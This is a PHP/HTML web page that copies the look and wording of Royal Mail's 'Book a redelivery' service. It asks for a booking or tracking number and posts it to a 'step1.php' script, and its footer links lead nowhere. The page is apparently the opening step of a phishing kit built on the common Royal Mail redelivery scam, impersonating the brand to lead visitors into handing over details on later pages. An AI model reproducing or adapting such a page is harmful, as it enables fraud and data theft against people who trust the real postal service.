<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Book a redelivery | Royal Mail</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        body { font-family: Arial, sans-serif; margin:0; background:#f4f4f4; }
        .header { background:#2A2A2D; color:white; padding:15px 0; }
        .logo { font-size:28px; font-weight:bold; }
        .container { max-width:1100px; margin:30px auto; background:white; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
        .content { padding:40px; }
        h1 { color:#2A2A2D; }
        .form-group { margin-bottom:20px; }
        label { display:block; margin-bottom:8px; font-weight:600; }
        input[type="text"] { width:100%; padding:12px; border:1px solid #ccc; border-radius:4px; }
        button { background:#e4002b; color:white; padding:14px 30px; border:none; font-size:16px; cursor:pointer; border-radius:4px; }
        button:hover { background:#c40025; }
        .rm-footer { background:#2A2A2D; color:#ccc; padding:30px; text-align:center; font-size:14px; }
    </style>
</head>
<body>

<div class="header">
    <div style="max-width:1100px;margin:auto;display:flex;align-items:center;justify-content:space-between;padding:0 20px;">
        <div class="logo">Royal Mail</div>
        <div>Book a Redelivery</div>
    </div>
</div>

<div class="container">
    <div class="content">
        <h1>Book a redelivery</h1>
        <p>Enter your booking or tracking reference to get started.</p>

        <form action="step1.php" method="POST">
            <div class="form-group">
                <label for="booking">Booking ID or Tracking Number</label>
                <input type="text" id="booking" name="booking_id" placeholder="e.g. RM123456789GB or 1Z999X999999" required>
            </div>

            <button type="submit">Continue →</button>
        </form>

        <p style="margin-top:30px;font-size:14px;color:#666;">
            You can find this on your Royal Mail notification or tracking email.
        </p>
    </div>
</div>

<div class="rm-footer">
    © Royal Mail Group Limited 2025<br>
    <a href="#" style="color:#ccc;margin:0 10px;">Privacy</a>
    <a href="#" style="color:#ccc;margin:0 10px;">Terms</a>
    <a href="#" style="color:#ccc;margin:0 10px;">Cookies</a>
</div>

</body>
</html>
